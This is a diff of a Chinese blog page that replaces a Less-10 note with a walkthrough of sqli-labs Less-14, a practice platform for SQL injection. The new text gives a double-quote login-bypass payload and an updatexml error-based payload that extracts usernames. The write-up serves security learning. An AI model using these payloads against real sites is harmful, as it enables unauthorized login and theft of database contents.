@@ -6,24 +6,26 @@
     
 
     
-    <title>sqli-labs-less10通关笔记 | 1eAder</title>
+    <title>sqli-labs-less14通关笔记 | 1eAder</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
         <meta name="keywords" content="sqli-labs" />
     
-    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-10)第十关，是第九关的哥哥 其实就是双引号闭合，基于时间的盲注。。。 所以我这里就不多讲了，对于脚本和方法，直接用第九关的。把单引号改为双引号即可。 但是我在第十关还是总结一下 在实战中，网站基于时间注入的例子不是很多，因为在设计网站的时候，实现前后端的互动，需要有不一样的页面呈现。所以，网页多少会有一些显示。即使没有显示，有可能htt">
+    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-14)OK，到了第十四关，我以为有啥不一样的。。。 结果。。。 单引号测试，啥都没有变，提示登陆失败 双引号测试，发现报错。 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for th">
 <meta name="keywords" content="sqli-labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs-less10通关笔记">
-<meta property="og:url" content="https://leaderzhang.github.io/2018/10/26/sqli-labs-less10/index.html">
+<meta property="og:title" content="sqli-labs-less14通关笔记">
+<meta property="og:url" content="https://leaderzhang.github.io/2018/10/29/sqli-labs-less14/index.html">
 <meta property="og:site_name" content="1eAder">
-<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-10)第十关，是第九关的哥哥 其实就是双引号闭合，基于时间的盲注。。。 所以我这里就不多讲了，对于脚本和方法，直接用第九关的。把单引号改为双引号即可。 但是我在第十关还是总结一下 在实战中，网站基于时间注入的例子不是很多，因为在设计网站的时候，实现前后端的互动，需要有不一样的页面呈现。所以，网页多少会有一些显示。即使没有显示，有可能htt">
+<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-14)OK，到了第十四关，我以为有啥不一样的。。。 结果。。。 单引号测试，啥都没有变，提示登陆失败 双引号测试，发现报错。 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for th">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-10-26T03:03:41.413Z">
+<meta property="og:image" content="https://i.imgur.com/1AOKBpA.png">
+<meta property="og:updated_time" content="2018-10-29T07:25:36.594Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs-less10通关笔记">
-<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-10)第十关，是第九关的哥哥 其实就是双引号闭合，基于时间的盲注。。。 所以我这里就不多讲了，对于脚本和方法，直接用第九关的。把单引号改为双引号即可。 但是我在第十关还是总结一下 在实战中，网站基于时间注入的例子不是很多，因为在设计网站的时候，实现前后端的互动，需要有不一样的页面呈现。所以，网页多少会有一些显示。即使没有显示，有可能htt">
+<meta name="twitter:title" content="sqli-labs-less14通关笔记">
+<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-14)OK，到了第十四关，我以为有啥不一样的。。。 结果。。。 单引号测试，啥都没有变，提示登陆失败 双引号测试，发现报错。 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for th">
+<meta name="twitter:image" content="https://i.imgur.com/1AOKBpA.png">
     
 
     
@@ -143,14 +145,14 @@
 </div>
 
                         <div class="main-body-content">
-                            <article id="pages-sqli-labs-less10" class="article article-single article-type-pages" itemscope itemprop="blogPost">
+                            <article id="pages-sqli-labs-less14" class="article article-single article-type-pages" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        sqli-labs-less10通关笔记
+        sqli-labs-less14通关笔记
         </h1>
     
 
@@ -160,8 +162,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2018/10/26/sqli-labs-less10/" class="article-date">
-            <time datetime="2018-10-26T03:02:52.000Z" itemprop="datePublished">2018-10-26</time>
+        <a href="/2018/10/29/sqli-labs-less14/" class="article-date">
+            <time datetime="2018-10-29T07:25:20.000Z" itemprop="datePublished">2018-10-29</time>
         </a>
     </div>
 
@@ -177,11 +179,19 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-10"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-10" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-10)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-10)</h1><p>第十关，是第九关的哥哥</p>
-<p>其实就是双引号闭合，基于时间的盲注。。。</p>
-<p>所以我这里就不多讲了，对于脚本和方法，直接用第九关的。把单引号改为双引号即可。</p>
-<p>但是我在第十关还是总结一下</p>
-<p>在实战中，网站基于时间注入的例子不是很多，因为在设计网站的时候，实现前后端的互动，需要有不一样的页面呈现。所以，网页多少会有一些显示。即使没有显示，有可能http-headers中的content-lenth的大小也会改变。可以根据这个来判断页面的错误与否。</p>
+            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-14"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-14" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-14)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-14)</h1><p>OK，到了第十四关，我以为有啥不一样的。。。</p>
+<p>结果。。。</p>
+<p>单引号测试，啥都没有变，提示登陆失败</p>
+<p>双引号测试，发现报错。</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;&quot;&quot; and password=&quot;&quot; LIMIT 0,1&#39; at line 1</code></p>
+<p>ok，双引号的闭合，简单。</p>
+<p>万能密码payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or &apos;1&apos;=1#</span><br><span class="line"></span><br><span class="line">passwd=asd</span><br><span class="line"></span><br><span class="line">submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/1AOKBpA.png" alt="万能密码"></p>
+<p>报错注入payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=asd</span><br><span class="line"></span><br><span class="line">passwd=&quot; and (updatexml(1,concat(0x7e,((select username from users limit 0,1)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/gHtedjP.png" alt="报错注入"></p>
+<p>第十四关，打卡完成。</p>
 
         </div>
         <footer class="article-footer">
@@ -189,7 +199,7 @@
 
 
 
-    <a data-url="https://leaderzhang.github.io/2018/10/26/sqli-labs-less10/" data-id="cjnv3itqr0006r8nuz2ipzxgq" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="https://leaderzhang.github.io/2018/10/29/sqli-labs-less14/" data-id="cjnv3itqy000hr8nunwtw6t8w" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -327,20 +337,20 @@
         
 <nav id="article-nav">
     
-        <a href="/2018/10/26/sqli-labs-less11/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/2018/10/30/sqli-labs-less15/" id="article-nav-newer" class="article-nav-link-wrap">
         <strong class="article-nav-caption">下一篇</strong>
         <p class="article-nav-title">
         
-            sqli-labs-less11通关笔记
+            sqli-labs-less15通关笔记
         
         </p>
         <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
     </a>
     
     
-        <a href="/2018/10/25/sqli-labs-less9/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2018/10/29/sqli-labs-less13/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">上一篇</strong>
-        <p class="article-nav-title">sqli-labs-less9通关笔记</p>
+        <p class="article-nav-title">sqli-labs-less13通关笔记</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -554,7 +564,7 @@
     var disqus_shortname = 'hexo-theme-hueman';
     
     
-    var disqus_url = 'https://leaderzhang.github.io/2018/10/26/sqli-labs-less10/';
+    var disqus_url = 'https://leaderzhang.github.io/2018/10/29/sqli-labs-less14/';
     
     (function() {
     var dsq = document.createElement('script');
